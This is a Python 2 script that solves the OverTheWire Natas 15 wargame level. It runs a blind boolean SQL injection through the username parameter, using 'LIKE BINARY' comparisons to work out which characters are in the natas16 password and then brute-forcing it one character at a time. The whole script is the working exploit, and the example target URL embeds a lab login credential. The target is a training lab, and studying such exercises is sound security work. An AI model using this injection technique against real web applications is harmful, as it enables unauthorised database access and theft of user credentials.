from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def url_sqli(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "This user exists."

	for c in all_chars:
		# SQL injection #1 - Using BINARY allows for a case-sensitive comparison
		req = requests.get(target + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "')

		# Verify if password uses current character
		if req.content.find(exists) != -1:
			parsed_chars += c
			print "[*] Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			# SQL injection #2
			req = requests.get(target + '?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		
			# Figuring out the correct location of characters in the password
			if req.content.find(exists) != -1:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	url_sqli(target)

main()

